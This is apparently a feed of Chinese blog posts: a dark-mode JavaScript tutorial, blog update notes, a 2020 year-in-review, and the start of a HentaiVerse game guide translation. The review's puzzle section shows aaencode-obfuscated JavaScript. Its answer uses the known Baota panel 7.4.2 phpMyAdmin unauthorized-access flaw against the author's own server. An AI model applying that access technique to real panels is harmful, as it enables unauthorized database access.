LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 18:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of 